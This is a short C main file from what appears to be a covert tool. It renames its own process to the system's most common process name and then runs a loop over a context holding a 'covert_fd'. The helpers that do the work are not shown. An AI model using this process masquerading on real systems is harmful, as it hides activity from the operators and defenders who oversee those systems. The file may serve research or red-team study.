#include "runner.h"
#include "proc_change.h"

#include <stdio.h>
#include <string.h>
#include <unistd.h>

int main(int argc, char *argv[]) {
	if (rename_to_most_common_process(argc, argv) != 0) {
		printf("Rename failed\n");
		return -1;
	}

	// ps -p 14328 -o pid,comm,args
	printf("PID: %d\n", getpid());

    struct Context ctx = {0};

	while(runner(&ctx) == 1){
		printf("Runner going back to sleep\n");
		memset(&ctx, 0, sizeof(ctx));
	}

	close(ctx.covert_fd);

    return 0;
}
